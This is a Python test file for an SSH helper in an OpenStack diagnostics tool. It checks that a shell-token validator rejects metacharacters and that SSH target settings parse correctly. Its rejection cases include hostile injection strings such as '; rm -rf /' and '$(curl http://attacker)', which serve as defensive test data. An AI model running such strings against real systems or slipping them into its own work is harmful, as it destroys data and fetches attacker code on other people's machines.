"""Tests for SSH-side input validation and helpers."""

from __future__ import annotations

import pytest

from openstack_doctor.nodes.ssh import SSHTarget, from_dict, is_safe_shell_token


@pytest.mark.parametrize(
    "name",
    [
        "nova-compute",
        "octavia-health-manager",
        "rabbitmq-server",
        "containerd",
        "kubelet",
        "user@host:22",  # the @, : characters are part of allowed set
        "service.target",
        "x_y+z",
    ],
)
def test_is_safe_shell_token_accepts_real_unit_names(name):
    assert is_safe_shell_token(name)


@pytest.mark.parametrize(
    "name",
    [
        "",
        "; rm -rf /",
        "foo bar",
        "$(curl http://attacker)",
        "`whoami`",
        "foo|bar",
        "foo&bar",
        "foo>bar",
        "foo<bar",
        "foo\nbar",
        "foo\\bar",
    ],
)
def test_is_safe_shell_token_rejects_metacharacters(name):
    assert not is_safe_shell_token(name)


def test_from_dict_requires_host():
    with pytest.raises(ValueError):
        from_dict({"user": "ubuntu"})
    with pytest.raises(ValueError):
        from_dict({"host": ""})


def test_from_dict_propagates_bastion_and_defaults():
    t = from_dict(
        {
            "host": "10.0.0.1",
            "user": "ubuntu",
            "key_filename": "~/.ssh/id_rsa",
            "bastion": {"host": "203.0.113.10"},
        }
    )
    assert isinstance(t, SSHTarget)
    assert t.host == "10.0.0.1"
    assert t.user == "ubuntu"
    assert t.key_filename and t.key_filename.endswith("id_rsa")
    assert t.bastion is not None
    assert t.bastion.host == "203.0.113.10"
    assert t.insecure_host_key is False  # strict by default


def test_from_dict_can_opt_in_to_insecure_host_key():
    t = from_dict({"host": "10.0.0.1", "insecure_host_key": True})
    assert t.insecure_host_key is True
